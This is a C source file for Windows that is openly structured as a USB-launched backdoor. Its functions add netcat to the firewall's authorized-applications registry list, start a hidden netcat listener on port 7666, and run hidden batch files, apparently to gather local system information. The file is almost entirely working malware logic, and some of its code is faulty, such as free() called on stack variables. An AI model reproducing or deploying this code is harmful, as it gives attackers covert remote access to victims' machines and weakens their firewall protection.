#include <windows.h>
#include <ShellApi.h>
#include <stdio.h>
#include <stdlib.h>
#include <strsafe.h>


void ErrorExit(LPTSTR lpszFunction) 
{ 
    // Retrieve the system error message for the last-error code

    LPVOID lpMsgBuf;
    LPVOID lpDisplayBuf;
    DWORD dw = GetLastError(); 

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | 
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dw,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR) &lpMsgBuf,
        0, NULL );

    // Display the error message and exit the process

    lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT, 
        (lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR)); 
    StringCchPrintf((LPTSTR)lpDisplayBuf, 
        LocalSize(lpDisplayBuf) / sizeof(TCHAR),
        TEXT("%s failed with error %d: %s"), 
        lpszFunction, dw, lpMsgBuf); 
    MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK); 

    LocalFree(lpMsgBuf);
    LocalFree(lpDisplayBuf);
    ExitProcess(dw); 
}


int GetLocalInfos(char * usb_letter)
{
    ShellExecute(0, "open", "go.bat", usb_letter, NULL, SW_HIDE);
    return 0;
}

int InstallBackdoor()
{
    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List /v \"C:\\Documents and Settings\\Marc\\Local Settings\\Application Data\\Microsoft\\netcat.exe\" /t REG_SZ /d \"C:\\Documents and Settings\\Marc\\Local Settings\\Application Data\\Microsoft\\netcat.exe:*:Enabled:chat\"");
    //system("net stop sharedaccess");
    //system("net start sharedaccess");
    ShellExecute(0, "open", "stay.bat", NULL, NULL, SW_HIDE);
    return 0;
}

int LaunchBackdoor()
{
STARTUPINFO         siStartupInfo;
PROCESS_INFORMATION piProcessInfo;

memset(&siStartupInfo, 0, sizeof(siStartupInfo));
memset(&piProcessInfo, 0, sizeof(piProcessInfo));
siStartupInfo.cb = sizeof(siStartupInfo);
if(CreateProcess(
   0, "C:\\Documents and Settings\\Marc\\Local Settings\\Application Data\\Microsoft\\netcat.exe -l -p 7666"
   ,0,0,FALSE,
   CREATE_DEFAULT_ERROR_MODE,0,0,                              
   &siStartupInfo,&piProcessInfo) == FALSE)
{
    ErrorExit(TEXT("CreateProcess"));

    return 1;
}
ErrorExit(TEXT("CreateProcess"));
free(&piProcessInfo);
free(&siStartupInfo);
return 0;
}

int main()
{
    CHAR szDrive[_MAX_DRIVE], szDir[_MAX_DIR], szFileName[_MAX_FNAME], szExt[_MAX_EXT], szPath[MAX_PATH];

    GetCurrentDirectory(MAX_PATH, szPath);
    _splitpath(szPath, szDrive, szDir, szFileName, szExt);
    char * usb_letter = szDrive;

    if(InstallBackdoor() != 0)
        return 1;
    if(LaunchBackdoor() != 0)
        return 1;
    if(GetLocalInfos(usb_letter) != 0)
        return 1;
    return 0;
}


